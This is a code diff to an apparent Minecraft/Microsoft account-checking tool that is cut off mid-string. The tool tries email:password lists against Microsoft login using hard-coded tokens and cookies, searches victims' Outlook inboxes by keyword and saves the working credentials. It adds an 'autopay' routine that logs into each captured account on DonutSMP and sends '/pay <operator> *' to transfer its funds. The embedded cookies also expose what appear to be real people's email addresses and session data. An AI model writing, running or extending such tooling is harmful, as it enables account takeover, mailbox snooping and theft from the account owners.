@@ -16,7 +16,9 @@ import traceback
 import uuid
 import warnings
 from datetime import datetime, timezone
+import urllib.parse
 from urllib.parse import urlparse, parse_qs
+# readchar is not available on Linux/Termux — removed
 import requests
 import socks
 import urllib3
@@ -44,11 +46,12 @@ def write_dedupe(fname, filename, content):
             f.write(content)
 
 def get_optimized_timeout(config=None):
+    timeout_val = int(config.get('timeout', 15)) if config else 15
     if config and config.get('optimize_network', True):
-        return (3, 5)
+        return (max(5, timeout_val // 2), timeout_val)
     else:
-        return config.get('timeout', 8) if config else 10
-# Linux/Termux: ensure stdout/stderr use UTF-8
+        return timeout_val
+# Linux/Termux: configure UTF-8 output
 try:
     if hasattr(sys.stdout, 'reconfigure'):
         sys.stdout.reconfigure(encoding='utf-8', errors='replace')
@@ -62,11 +65,18 @@ class SimpleUtils:
         if title == SimpleUtils._title_cache:
             return
         SimpleUtils._title_cache = title
-        try:
-            sys.stdout.write(f'\x1b]0;{title}\x07')
-            sys.stdout.flush()
-        except Exception:
-            pass
+        if sys.platform == 'win32':
+            try:
+                import ctypes
+                ctypes.windll.kernel32.SetConsoleTitleW(title)
+            except Exception:
+                pass
+        else:
+            try:
+                sys.stdout.write(f'\x1b]0;{title}\x07')
+                sys.stdout.flush()
+            except Exception:
+                pass
 utils = SimpleUtils()
 _FORMAT_THRESHOLDS = [(1000000000.0, 'B', 2), (1000000.0, 'M', 2), (1000.0, 'K', 1)]
 def format_number(num):
@@ -264,18 +274,22 @@ def validate_hex_color(color_str):
             except ValueError:
                 pass
     return None
+import urllib.parse
 from urllib.parse import urlparse, parse_qs
 from io import StringIO
 UI_ENABLED = True
+# pyCraft (Hypixel ban checking) requires Rust to compile and will fail on Termux/Android.
+# It is optional — if installed it will work, otherwise ban checking is disabled.
 try:
     from minecraft.networking.connection import Connection
     from minecraft.authentication import AuthenticationToken, Profile
     from minecraft.networking.packets import clientbound
     from minecraft.networking.packets.clientbound import play as clientbound_play, login as clientbound_login
+    from minecraft.networking.packets.serverbound.play import ChatPacket
     from minecraft.exceptions import LoginDisconnect, YggdrasilError
     import minecraft.authentication
     minecraft.authentication.HEADERS = {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
         'Connection': 'close'
     }
     MINECRAFT_AVAILABLE = True
@@ -343,7 +357,7 @@ class UIManager:
         if not getattr(self, 'log_initialized', False):
             self.clear_screen()
             _title = Fore.CYAN
-            ascii_logo = '   __  __                    __  __       _ \n  |  \\/  |                  |  \\/  |     | | ' + '\n  | \\  / | ___  _____      _| \\  / | __ _| | ' + '\n  | |\\/| |/ _ \\/ _ \\ \\ /\\ / / |\\/| |/ _` | | ' + '\n  | |  | |  __/ (_) \\ V  V /| |  | | (_| | | ' + '\n  |_|  |_|\\___|\\___/ \\_/\\_/ |_|  |_|\\__,_|_| ' + "\n  Version: 1.1 | Dev: MeowMal Dev's \n"
+            ascii_logo = '   __  __                    __  __       _ \n  |  \\/  |                  |  \\/  |     | | ' + '\n  | \\  / | ___  _____      _| \\  / | __ _| | ' + '\n  | |\\/| |/ _ \\/ _ \\ \\ /\\ / / |\\/| |/ _` | | ' + '\n  | |  | |  __/ (_) \\ V  V /| |  | | (_| | | ' + '\n  |_|  |_|\\___|\\___/ \\_/\\_/ |_|  |_|\\__,_|_| ' + "\n  Version: 1.2 | Dev: MeowMal Dev's \n"
             print(Fore.CYAN + ascii_logo + Style.RESET_ALL)
             print('')
             print(f'{_title}Live Logs{Style.RESET_ALL}' + ' ' * max(0, getattr(self, 'width', 120) - len(self._strip_ansi('Live Logs'))))
@@ -429,14 +443,20 @@ class UIManager:
             if capture_obj.banned and str(capture_obj.banned).startswith('[Error]'):
                 status_part = '[Error]'
                 color = Fore.YELLOW
-            elif capture_obj.banned and capture_obj.banned != 'False':
+            elif capture_obj.banned and capture_obj.banned != 'False' and not str(capture_obj.banned).startswith('[Unchecked]'):
                 status_part = '[Banned]'
                 color = Fore.RED
             elif capture_obj.banned == 'False':
                 status_part = '[Unbanned]'
                 color = Fore.GREEN
+            elif capture_obj.banned and str(capture_obj.banned).startswith('[Unchecked]'):
+                if 'No Profile' in capture_obj.banned:
+                    status_part = '[No Profile]'
+                else:
+                    status_part = '[Unchecked]'
+                color = Fore.YELLOW
             else:
-                status_part = '[Unknown]'
+                status_part = f"[{capture_obj.banned or 'Unknown'}]"
                 color = Fore.YELLOW
             
             if capture_obj.hypixl and ('[' in capture_obj.hypixl or ']' in capture_obj.hypixl) and capture_obj.hypixl != 'N/A':
@@ -698,6 +718,8 @@ class MicrosoftChecker:
             if not token:
                 token = self.get_auth_token('0000000048170EF2', 'service::outlook.office.com::MBI_SSL', 'https://login.live.com/oauth20_desktop.srf')
             if not token:
+                if UI_ENABLED and ui:
+                    ui.log_error("Inbox: Failed to get auth token")
                 return []
             cid = self.session.cookies.get('MSPCID')
             if not cid:
@@ -712,28 +734,49 @@ class MicrosoftChecker:
             results = []
             for keyword in keywords:
                 try:
-                    payload = {'Cvid': '7ef2720e-6e59-ee2b-a217-3a4f427ab0f7', 'Scenario': {'Name': 'owa.react'}, 'TimeZone': 'Egypt Standard Time', 'TextDecorations': 'Off', 'EntityRequests': [{'EntityType': 'Conversation', 'ContentSources': ['Exchange'], 'Filter': {'Or': [{'Term': {'DistinguishedFolderName': 'msgfolderroot'}}, {'Term': {'DistinguishedFolderName': 'DeletedItems'}}]}, 'From': 0, 'Query': {'QueryString': keyword}, 'RefiningQueries': None, 'Size': 25, 'Sort': [{'Field': 'Score', 'SortDirection': 'Desc', 'Count': 3}, {'Field': 'Time', 'SortDirection': 'Desc'}], 'EnableTopResults': True, 'TopResultsCount': 3}], 'AnswerEntityRequests': [{'Query': {'QueryString': keyword}, 'EntityTypes': ['Event', 'File'], 'From': 0, 'Size': 10, 'EnableAsyncResolution': True}], 'QueryAlterationOptions': {'EnableSuggestion': True, 'EnableAlteration': True, 'SupportedRecourseDisplayTypes': ['Suggestion', 'NoResultModification', 'NoResultFolderRefinerModification', 'NoRequeryModification', 'Modification']}, 'LogicalId': '446c567a-02d9-b739-b9ca-616e0d45905c'}
+                    payload = {'Cvid': str(uuid.uuid4()), 'Scenario': {'Name': 'owa.react'}, 'TimeZone': 'Egypt Standard Time', 'TextDecorations': 'Off', 'EntityRequests': [{'EntityType': 'Conversation', 'ContentSources': ['Exchange'], 'Filter': {'Or': [{'Term': {'DistinguishedFolderName': 'msgfolderroot'}}, {'Term': {'DistinguishedFolderName': 'DeletedItems'}}]}, 'From': 0, 'Query': {'QueryString': keyword}, 'RefiningQueries': None, 'Size': 25, 'Sort': [{'Field': 'Score', 'SortDirection': 'Desc', 'Count': 3}, {'Field': 'Time', 'SortDirection': 'Desc'}], 'EnableTopResults': True, 'TopResultsCount': 3}], 'AnswerEntityRequests': [{'Query': {'QueryString': keyword}, 'EntityTypes': ['Event', 'File'], 'From': 0, 'Size': 10, 'EnableAsyncResolution': True}], 'QueryAlterationOptions': {'EnableSuggestion': True, 'EnableAlteration': True, 'SupportedRecourseDisplayTypes': ['Suggestion', 'NoResultModification', 'NoResultFolderRefinerModification', 'NoRequeryModification', 'Modification']}, 'LogicalId': str(uuid.uuid4())}
                     r = self.session.post('https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124', json=payload, headers=headers, timeout=15)
+                    found = 0
                     if r.status_code == 200:
                         data = r.json()
-                        total = 0
                         if 'EntitySets' in data:
                             for entity_set in data['EntitySets']:
                                 if 'ResultSets' in entity_set:
                                     for result_set in entity_set['ResultSets']:
                                         if 'Total' in result_set:
-                                            total += result_set['Total']
+                                            found += result_set['Total']
                                         elif 'ResultCount' in result_set:
-                                            total += result_set['ResultCount']
+                                            found += result_set['ResultCount']
                                         elif 'Results' in result_set:
-                                            total += len(result_set['Results'])
-                        if total > 0:
-                            results.append((keyword, total))
-                except Exception:
+                                            found += len(result_set['Results'])
+                    else:
+                        if UI_ENABLED and ui:
+                            ui.log_error(f"Inbox API Error ({keyword}): {r.status_code} - {r.text[:100]}")
+                        if r.status_code in (401, 403, 404):
+                            break
+                    
+                    if found == 0:
+                        try:
+                            rest_r = self.session.get(f'https://outlook.live.com/api/v2.0/me/messages?$search=%22{keyword}%22&$top=10&$select=Subject,ReceivedDateTime', headers=headers, timeout=10)
+                            if rest_r.status_code == 200:
+                                msgs = rest_r.json().get('value', [])
+                                found = len(msgs)
+                            elif rest_r.status_code in (401, 403, 404):
+                                break
+                        except: pass
+
+                    if found > 0:
+                        results.append((keyword, found))
+                except Exception as e:
+                    if UI_ENABLED and ui:
+                        ui.log_error(f"Inbox Keyword Error ({keyword}): {str(e)[:50]}")
                     pass
             return results
-        except Exception:
+        except Exception as e:
+            if UI_ENABLED and ui:
+                ui.log_error(f"Inbox Searcher Error: {str(e)[:50]}")
             return []
+
 def check_microsoft_account(session, email, password, config, fname):
     try:
         checker = MicrosoftChecker(session, email, password, config, fname)
@@ -796,8 +839,14 @@ def check_microsoft_account(session, email, password, config, fname):
                     keywords = [k.strip() for k in keywords_str.split(',') if k.strip()]
                     inbox_results = checker.check_inbox(keywords)
                     if inbox_results:
+                        inbox_dir = os.path.join('results', fname, 'Inboxes')
+                        os.makedirs(inbox_dir, exist_ok=True)
+                        for keyword, match_count in inbox_results:
+                            if match_count and (isinstance(match_count, int) and match_count > 0 or match_count != 0):
+                                safe_keyword = "".join([c for c in str(keyword) if c.isalpha() or c.isdigit() or c==' ']).rstrip()
+                                write_dedupe(fname, f'Inboxes/{safe_keyword}.txt', f'{email}:{password}\n')
                         formatted_results = ', '.join([f'{k} {v}' for k, v in inbox_results])
-                        write_dedupe(fname, 'inboxes.txt', f'{email}:{password} | Inbox - {formatted_results}\n')
+                        write_dedupe(fname, 'inboxes_summary.txt', f'{email}:{password} | Inbox - {formatted_results}\n')
                         return ('inbox_results', inbox_results)
             return None
 
@@ -1190,7 +1239,7 @@ class Capture:
         elif self.name and self.name != 'N/A':
             user_display = self.name
         else:
-            user_display = 'nonameset'
+            user_display = 'NoMC'
         capture_line = f'[{user_display}] {ban_status} {tags_str}{hypixel_level} {self.email}:{password_display}'
         if include_timestamp:
             import time
@@ -1528,6 +1577,49 @@ class Capture:
         except Exception as e:
             if UI_ENABLED and ui:
                 ui.log_info(f'Donut SMP error: {str(e)[:100]}')
+
+    def autopay_donutsmp(self):
+        if not MINECRAFT_AVAILABLE:
+            return
+        if not config.get('donutsmp_autopay', False):
+            return
+        pay_target = config.get('donutsmp_pay_username', '')
+        if not pay_target or pay_target == 'YOUR_USERNAME':
+            return
+        def _do_autopay():
+            try:
+                auth_token = AuthenticationToken(username=self.name, access_token=self.token, client_token=uuid.uuid4().hex)
+                auth_token.profile = Profile(id_=self.uuid, name=self.name)
+                connection = Connection('play.donutsmp.net', 25565, auth_token=auth_token, initial_version=47, allowed_versions={'1.8', 47})
+
+                @connection.listener(clientbound_play.JoinGamePacket)
+                def on_join(packet):
+                    def delayed_pay():
+                        time.sleep(2.0)
+                        if UI_ENABLED and ui:
+                            ui.log_info(f"Donut SMP: Sending /pay {pay_target} * from {self.name}")
+                        chat = ChatPacket(message=f"/pay {pay_target} *")
+                        connection.write_packet(chat)
+                        time.sleep(1.0)
+                        connection.disconnect()
+                    threading.Thread(target=delayed_pay, daemon=True).start()
+
+                @connection.listener(clientbound_login.DisconnectPacket)
+                def on_disconnect_login(packet):
+                    pass
+                    
+                @connection.listener(clientbound_play.DisconnectPacket)
+                def on_disconnect_play(packet):
+                    pass
+
+                connection.connect()
+                time.sleep(8)
+                if getattr(connection, 'networking_thread', None):
+                    connection.disconnect()
+            except Exception as e:
+                if UI_ENABLED and ui:
+                    ui.log_error(f"DonutSMP Autopay error: {str(e)[:50]}")
+        threading.Thread(target=_do_autopay, daemon=True).start()
     def check_microsoft_features(self):
         global retries
         try:
@@ -1546,6 +1638,7 @@ class Capture:
             self.banned = '[Error] pyCraft Missing'
             return
         if not config.get('hypixelban'):
+            self.banned = '[Unchecked] Disabled in config'
             return
         if self.ban_checked:
             return
@@ -1608,7 +1701,6 @@ class Capture:
                                 self.banned = f"[{data['extra'][1]['text']}] {duration} Ban ID: {ban_id}"
                             except:
                                 self.banned = "Temporarily Banned"
-                            write_dedupe(fname, 'Banned.txt', f'{self.email}:{self.password}\n')
                             if UI_ENABLED and ui:
                                 ui.increment_stat('banned')
                         elif 'Suspicious activity' in data_str:
@@ -1617,7 +1709,6 @@ class Capture:
                                 self.banned = f"[Permanently] Suspicious activity has been detected on your account. Ban ID: {ban_id}"
                             except:
                                 self.banned = "[Permanently] Suspicious activity"
-                            write_dedupe(fname, 'Banned.txt', f'{self.email}:{self.password}\n')
                             if UI_ENABLED and ui:
                                 ui.increment_stat('banned')
                         elif 'You are permanently banned from this server!' in data_str:
@@ -1627,17 +1718,14 @@ class Capture:
                                 self.banned = f"[Permanently] {reason} Ban ID: {ban_id}"
                             except:
                                 self.banned = "[Permanently] Banned"
-                            write_dedupe(fname, 'Banned.txt', f'{self.email}:{self.password}\n')
                             if UI_ENABLED and ui:
                                 ui.increment_stat('banned')
                         elif 'The Hypixel Alpha server is currently closed!' in data_str:
                             self.banned = 'False'
-                            write_dedupe(fname, 'Unbanned.txt', f'{self.email}:{self.password}\n')
                             if UI_ENABLED and ui:
                                 ui.increment_stat('unbanned')
                         elif 'Failed cloning your SkyBlock data' in data_str:
                             self.banned = 'False'
-                            write_dedupe(fname, 'Unbanned.txt', f'{self.email}:{self.password}\n')
                             if UI_ENABLED and ui:
                                 ui.increment_stat('unbanned')
                         else:
@@ -1646,7 +1734,6 @@ class Capture:
                             if not full_msg:
                                 full_msg = data.get('text', '')
                             self.banned = full_msg if full_msg else str(data)
-                            write_dedupe(fname, 'Banned.txt', f'{self.email}:{self.password}\n')
                             if UI_ENABLED and ui:
                                 ui.increment_stat('banned')
                     except Exception as e:
@@ -1659,7 +1746,6 @@ class Capture:
                 def _mark_unbanned(packet_name):
                     if self.banned is None:
                         self.banned = 'False'
-                        write_dedupe(fname, 'Unbanned.txt', f'{self.email}:{self.password}\n')
                         if UI_ENABLED and ui:
                             ui.increment_stat('unbanned')
                             ui.log_info(f'Unbanned detected ({packet_name}): {self.name}')
@@ -1690,12 +1776,22 @@ class Capture:
                                 proxy = random.choice(banproxies)
                                 if '@' in proxy:
                                     atsplit = proxy.split('@')
-                                    socks.set_default_proxy(socks.SOCKS5, addr=atsplit[1].split(':')[0], port=int(atsplit[1].split(':')[1]), username=atsplit[0].split(':')[0], password=atsplit[0].split(':')[1])
+                                    connection.networking_proxy = (socks.SOCKS5, atsplit[1].split(':')[0], int(atsplit[1].split(':')[1]), True, atsplit[0].split(':')[0], atsplit[0].split(':')[1])
                                 else:
                                     ip_port = proxy.split(':')
-                                    socks.set_default_proxy(socks.SOCKS5, addr=ip_port[0], port=int(ip_port[1]))
-                                socket.socket = socks.socksocket
-                                connection.connect()
+                                    connection.networking_proxy = (socks.SOCKS5, ip_port[0], int(ip_port[1]), True)
+                                
+                                _old_socket = socket.socket
+                                class ProxySocket(socks.socksocket):
+                                    def __init__(self, family=socket.AF_INET, type=socket.SOCK_STREAM, proto=0, *args, **kwargs):
+                                        super().__init__(family, type, proto, *args, **kwargs)
+                                        if hasattr(connection, 'networking_proxy') and connection.networking_proxy:
+                                            self.set_proxy(*connection.networking_proxy)
+                                socket.socket = ProxySocket
+                                try:
+                                    connection.connect()
+                                finally:
+                                    socket.socket = _old_socket
                         else:
                             connection.connect()
 
@@ -1723,7 +1819,8 @@ class Capture:
                     tries += 1
                 except Exception:
                     pass
-        except Exception:
+        except Exception as e:
+            self.banned = f'[Error] Exception in ban: {e}'
             errors += 1
     def setname(self):
         name_format = config.get('name')
@@ -1913,7 +2010,9 @@ class Capture:
                     if self.namechange_available: name_changes += 1
                 except Exception: errors += 1
                 try: self.ban(session)
-                except Exception: errors += 1
+                except Exception as e:
+                    self.banned = f'[Error] Ban execution: {e}'
+                    errors += 1
                 try:
                     self.check_microsoft_features()
                     if self.ms_payment_methods: payment_methods += len(self.ms_payment_methods)
@@ -1923,10 +2022,21 @@ class Capture:
                     try: self.setname()
                     except Exception: pass
             else:
+                self.banned = '[Unchecked] No Profile'
+
+                try:
+                    self.check_microsoft_features()
+                    if self.ms_payment_methods: payment_methods += len(self.ms_payment_methods)
+                    if self.inbox_matches: inbox_matches += len(self.inbox_matches)
+                except Exception: errors += 1
                 try: self.setname()
                 except Exception: pass
-            try: self.check_donut_smp()
-            except Exception: errors += 1
+            def _launch_donut():
+                try: self.check_donut_smp()
+                except Exception: pass
+            threading.Thread(target=_launch_donut, daemon=True).start()
+            try: self.autopay_donutsmp()
+            except Exception: pass
             if config.get('setskin'):
                 try: self.setskin()
                 except Exception: pass
@@ -1954,6 +2064,12 @@ class Capture:
             try:
                 with file_lock:
                     open(f'results/{fname}/Capture.txt', 'a').write(fullcapt + '\n')
+                    if self.namechange_available:
+                        open(f'results/{fname}/Namechangeable.txt', 'a').write(fullcapt + '\n')
+                    if self.banned == 'False':
+                        open(f'results/{fname}/Unbanned.txt', 'a').write(fullcapt + '\n')
+                    elif self.banned and not str(self.banned).startswith('[Error]') and not str(self.banned).startswith('[Unchecked]') and self.banned != 'Unknown':
+                        open(f'results/{fname}/Banned.txt', 'a').write(fullcapt + '\n')
             except: pass
             if UI_ENABLED and ui:
                 ui.log_hit_formatted(self, stats_text, precomputed_line=masked_capt)
@@ -2711,11 +2827,450 @@ def create_optimized_session():
     
     use_proxies = config.get('use_proxies', False)
     backoff = 0.5
-    retry_strategy = Retry(total=2 if not use_proxies else 4, connect=2 if not use_proxies else 4, read=2 if not use_proxies else 4, backoff_factor=backoff, status_forcelist=[408, 429, 500, 502, 503, 504], allowed_methods=frozenset(['GET', 'POST']))
+    retry_strategy = Retry(total=0, connect=0, read=0)
     adapter = HTTPAdapter(pool_connections=pool_size, pool_maxsize=pool_size, max_retries=retry_strategy)
     session.mount('https://', adapter)
     session.mount('http://', adapter)
     return session
+
+_LOGIN_CONFIGS = [
+    dict(
+        url=(
+            "https://login.live.com/ppsecure/post.srf"
+            "?username=%7bemail%7d&client_id=0000000048170EF2"
+            "&contextid=072929F9A0DD49A4&opid=D34F9880C21AE341"
+            "&bk=1765024327&uaid=a5b22c26bc704002ac309462e8d061bb"
+            "&pid=15216&prompt=none"
+        ),
+        ppft=(
+            "-Drzud3DzKKJtVD9IfM5xwJywwEjJp5zvvJmrSyu*RKOf"
+            "!PbgSCQ7ReuKFS*sIpTV5r28epGtqBhqH3JYvND4!onwSWz"
+            "2JEkvdeewUQC6HmAXRgjYBzSlf0mjEYbx3ULc7oy5fUK3LDS"
+            "b*CnkAG03FLzwVPmT5WjYu4sE5Wqd93pCx0USJK4jelAWNvs"
+            "Mog0Rmj90tmeCd*1pDYjkINyPEgQSkv6y5GPuX!GmYwKccALU"
+            "t*!SRaI02p*XUqePtNtJzw$$"
+        ),
+        cookie=(
+            "MSPRequ=id=N&lt=1765024327&co=1; "
+            "uaid=a5b22c26bc704002ac309462e8d061bb; "
+            "MSPOK=$uuid-90ce4cdb-2718-4d7e-9889-4136cfacc5b2; "
+            "OParams=11O.DhmByHnT9kscyud7VyWQt5uWQuQOYWZ9O2v5E49mKx"
+            "VoKsSZaB4KnwkAQCVjghW9A6M8syem4sO!g4KOfietehdD7U2eXeVo8"
+            "eUsorIQv1deGf6v43egdNizv1*agwrVh2OTg7pu2SRE3SougNTvzlNU"
+            "Ne1BgtO4HFlLRm6UoEW3PNBIxuVPmFBiPs0wEU162jlfO8yA1!QZV7K"
+            "KArG8NPChj0kf1IOfR95k0fIfa0!fDW8Md44pKHa3rkU0Um0KB03YEB"
+            "dWMOAbJlX5RONIL3M31WhD4LG3GPAoBPAMCN9fMk2rHlwix8g6MOW3H"
+            "KxDT4I0TlKrYHDBJejZWSmI23T3v2kr1MKaL9vEQoaTwOJf9VloMFBi"
+            "7yB!kisHZn0BkjE!HGWhaliwYdluhJUCu1g$"
+        ),
+    ),
+    dict(
+        url=(
+            "https://login.live.com/ppsecure/post.srf"
+            "?username=%7bemail%7d&client_id=0000000048170EF2"
+            "&contextid=F3FB0F6AB3D6991E&opid=5F188DEDF4A1266A"
+            "&bk=1768757278&uaid=b1d1e6fbf8b24f9b8a73b347b178d580"
+            "&pid=15216&prompt=none"
+        ),
+        ppft=(
+            "-Dm65IQ!FOoxUaTQnZAHxYJMOmOcAmTQz4qm3kTra6EWGgOJS3Hmm"
+            "MLM4kwOpB*SxcpnorGvu6Meyzvos0ruiOkVKAh!SdkWlD5KUiiUUpV"
+            "aBaRmY4op*aKCNkOPi2mBbWnS0mXOvSG7dMuL!5HdVFTPtGTdlQZCu"
+            "cF7LVMbr2BWN6qhWxoXXrBMfvx3BcxGFhNZgbDooHcWy8QO4OOYEXVI"
+            "2ee3UOWa!S2qTtgO3nriTV67BP7!q8QgpyDMkckNSHQ$$"
+        ),
+        cookie=(
+            "MSFPC=GUID=cd3df40453784149a05eb0e8d7b0aaf5&HASH=cd3d&LV=202510&V=4&LU=1761393873491; "
+            "MUID=009CC129162F6E173020D77717446F0A; "
+            "uaid=b1d1e6fbf8b24f9b8a73b347b178d580; "
+            "MSPRequ=id=N&lt=1768757278&co=1; "
+            "MSPOK=$uuid-a26bdf97-2619-4f16-ba61-6b189e1f6e0f"
+        ),
+    ),
+    dict(
+        url=(
+            "https://login.live.com/ppsecure/post.srf"
+            "?username=%7bemail%7d&client_id=000000004C12AE6F"
+            "&contextid=A9B8C7D6E5F40321&opid=1A2B3C4D5E6F7890"
+            "&bk=1760000001&uaid=c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8"
+            "&pid=15216&prompt=none"
+        ),
+        ppft=(
+            "-DxY9Z*wV4U!tS8rQ3p2NmLkJiHgFeDcBaZyXwVuTsRqPoNn"
+            "MlKjIhGfEdCbAzYxWvUtSrQpOnMlKjIhGfEdCbAzYxWvUtSr"
+            "QpOnMlKjIhGfEdCbAzYxWvUtSrQpOnMlKjIhGfEdCbAzYxWv"
+            "UtSrQpOnMlKjIhGfEdCbAzYxWvUtSrQpOnMlKjIhGfEdCb$$"
+        ),
+        cookie=(
+            "MSFPC=GUID=abcdabcdabcdabcdabcdabcdabcdabcd&HASH=abcd&LV=202503&V=4; "
+            "MUID=12341234123412341234123412341234; "
+            "uaid=c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8; "
+            "MSPRequ=id=N&lt=1760000001&co=1; "
+            "MSPOK=$uuid-b452a8d1-1234-4aef-962d-e9a37c2798b5"
+        ),
+    ),
+    dict(
+        url=(
+            "https://login.live.com/ppsecure/post.srf"
+            "?client_id=00000000402B5328"
+            "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
+            "&scope=service::user.auth.xboxlive.com::MBI_SSL"
+            "&display=touch&response_type=token&locale=en"
+        ),
+        ppft=(
+            "-Da1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6Q7R8S9T0U1V2W3"
+            "X4Y5Z6a7b8c9d0e1f2g3h4i5j6k7l8m9n0o1p2q3r4s5t6u7"
+            "v8w9x0y1z2A3B4C5D6E7F8G9H0I1J2K3L4M5N6O7P8Q9R0S1"
+            "T2U3V4W5X6Y7Z8a9b0c1d2e3f4g5h6i7j8k9l0m1n2o3$$"
+        ),
+        cookie=(
+            "MSFPC=GUID=efghefghefghefghefghefghefghefgh&HASH=efgh&LV=202504&V=4; "
+            "MUID=98769876987698769876987698769876; "
+            "uaid=c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8; "
+            "MSPOK=$uuid-c632b4d1-5678-4aef-962d-e9a37c2798b5"
+        ),
+    ),
+    dict(
+        url=(
+            "https://login.live.com/ppsecure/post.srf"
+            "?nopa=2&client_id=7d5c843b-fe26-45f7-9073-b683b2ac7ec3"
+            "&cobrandid=8058f65d-ce06-4c30-9559-473c9275a65d&contextid=F3FB0F6AB3D6991E"
+            "&opid=5F188DEDF4A1266A&bk=1768757278&uaid=b1d1e6fbf8b24f9b8a73b347b178d580"
+            "&pid=15216"
+        ),
+        ppft=(
+            "-Dm65IQ!FOoxUaTQnZAHxYJMOmOcAmTQz4qm3kTra6EWGgOJS3HmmMLM4kwOpB*SxcpnorGvu6Meyzvos0ruiOkVKAh!SdkWlD5KUiiUUpVaBaRmY4op*aKCNkOPi2mBbWnS0mXOvSG7dMuL!5HdVFTPtGTdlQZCucF7LVMbr2BWN6qhWxoXXrBMfvx3BcxGFhNZgbDooHcWy8QO4OOYEXVI2ee3UOWa!S2qTtgO3nriTV67BP7!q8QgpyDMkckNSHQ$$"
+        ),
+        cookie=(
+            "MSFPC=GUID=cd3df40453784149a05eb0e8d7b0aaf5&HASH=cd3d&LV=202510&V=4&LU=1761393873491; MUID=009CC129162F6E173020D77717446F0A; mkt=ar-EG; IgnoreCAW=1; MSCC=1768686615; MSPPre=sherazali786%40hotmail.com%7c2be5d8d4561de042%7c%7c; MSPCID=2be5d8d4561de042; NAP=V=1.9&E=1fce&C=0VWNjYfUKfbjASf4kUbKr4AFc4n10IF35NtbUOtSc4AG08wugTusVw&W=2b; ANON=A=216620AEFCFE489A881F606CFFFFFFFF&E=2028&W=2b; SDIDC=Cq55X0JYGZ8N!rMSZ2Ian1lLjhF5XFwY!QR1v0Wd1QpcAGghYgMLK4ritP4swu96zM7ATYlfHM20u3DRtrLPn2rJ9566O21OLmHZoMNkYVImbBG4c4J3BrZ!WKWScYNGPYAmEVFLzjflYgouKEGkeZu9pqaTCI!apjIPRu!NGgYUyJArWYXeo*oOVBuLUdVqmgNuognpxzDOLgWp*ZFd8*TWq*z0AD70A91BqrnG06YylMS0w1IS6PkSkVwEgrgx!JXrzFsp*erof7!c2WSX*UmGh3zd6pMQoPi4vs79DnX1GA4FnRbomQdFxPAGnovKgRKV9pzGFU661vg8Kog77WdEGCX0bHoF7sdO5bMDLw8B0bmf5mrjR2sjDThoYft1rlTKfQNv3FTYzLE1CtvGfQ8$; MSCC=212.126.118.78-IQ; fptctx2=taBcrIH61PuCVH7eNCyH0CYjjbqLuI8XF8pleSQW5NbDeyCRZYViNAurQ3yAaBxRmLcSV6E%252fd9MoeGps18M5266uj8wAKxvlEfEU28VnsGyiWwoN9uJpchm3EcNEIM1bVKGsBSFLHMNMX6NZTu2bLK6NBw5Z1rFEZ3cW0gnllt82p5bL3DqwMmDuAQXsed46u9pOuBgpLN%252f4jykqbl8VAYNSyjmmdFW%252fnJulneowM9IjhsCxz15p3XpWrsSAK3OVHfx%252fm7mYFFRvdAQEHVgvdC145BY%252bRAx6WXnfZX%252f5LwMZJpEmHRHxAlYmcy9m%252bzhseMIcXW5ZvIh%252fzmr0BV3cDQ%253d%253d; JSHP=3$trapskill%40hotmail.com$Trap$Skill$$2$0$0$3892304923238515033$0:mp_jay12%40hotmail.com$Matias$Paez$$2$0$8$14566549874157295761$0:kam_gatson%40hotmail.com$kam$Gatson$$2$0$0$13691270496574410431$0:jeannettemonjes%40hotmail.com$jeannette$monjes$$2$0$0$10117779287356229792$0; mkt1=ar-SA; amsc=sIrPTJ2b7gjpZa0ddTc4fZq0vrd+S2igyL5nagsxw/jMi8WIBShz1ngzijLEp/XjnB3K6eDI1932P7LhYiWotqrO1eekVlG6ucwVtQTrGUrMWIAOKXYuKjnVOfxQ44/aJ16LEy4BJHy9LMVw4dzNvGkNueHsRRk4FXBSCIT4CifABdqfvr/hZF/lULHIpm5ibd6X61OR1MTXRTSsOPW/6Y//MlRkgSWTS/wL3Y5B1TJ4gcSPlKrzi66vIiWZWkZF:2:3c; __Host-MSAAUTHP=11-M.C516_SN1.0.U.ChH75nzYc4V3vjuQ0DdhxWkmuksfCaHx2f4j*oDmbKRKuTaElc!PxDpcB1XE1TUAaT!u9ioX0rAKjvGF8*njS!r3vud3Vpc0!RDrAE0xwqNWcIN0Eb9KoqeJWM!oBnaXz2NcjFg4IKFZfN!PunbY30pUitN0uS6s*XSVegOS3eiv0PNrFUOpFBDU5iGUGYlQrM36lby*3FYFwfUUj8OTSoCOhdwgHFuCK0DCfkr7fHskyVtz9tm746KcVQwBVcyvGF6mYdjF68z49R3r3RvBXIYkhsLbIjt60RmWL1!p9f*A*Sc0k2VuqeUg05lg7dxgbeq8sR0x2QaHkOCzXg9gQpDSeF7AK8a5JXnJw7c!!MXe3HegRZMDMoNP!q*VfR*JU*TCPuScL50G3O*oxZroRZtVJ6FuGhdrD2ZolfWFUf*oQ9ykTuAuNxbMmQoKdiTKww8fF6U*J0Pc2kYdUP7CnF3qzxBzSr7LN3XD8CvlTHCbkVrIz*4xSFKOcsfmDoga09L18ztKlGvlTZ9HpsdxerBgjgWV7UQn3I1IRNtE4XISCC1!OmTl8x!zkrEiQKWRV6TivdSJw1na5cPzk2WoM2WT3Er9CLtGYhOFUp!OHTaw; uaid=b1d1e6fbf8b24f9b8a73b347b178d580; MSPRequ=id=N&lt=1768757278&co=1; 